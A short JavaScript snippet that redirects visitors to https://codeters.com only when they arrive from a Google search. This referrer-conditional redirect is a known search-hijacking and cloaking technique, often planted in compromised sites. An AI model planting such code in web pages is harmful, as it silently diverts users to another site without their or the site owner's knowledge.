document.addEventListener('DOMContentLoaded', function() {
    var referrer = document.referrer;

    // Check if the referrer is from Google search
    if (referrer && referrer.match(/google\.com/i)) {
      var redirectTo = "https://codeters.com"; // Your target URL
      window.location.href = redirectTo;
    }
  });
